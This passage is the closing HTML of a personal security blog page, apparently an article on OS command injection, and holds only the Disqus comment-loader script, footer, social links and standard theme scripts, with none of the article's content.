Step-by-Step Guide</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html';
							this.page.identifier = '23'; 
							this.language = 'en_GB';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>Sakibul Ali Khan • © 2024 • Offens!ve Blogs</p></div><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://www.youtube.com/@sakibulalikhan" aria-label="Youtube"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#youtube"/></svg></a></div></div></footer></div><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=74fad06980c30243d91d72c7c57fcdb8"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script></body></html>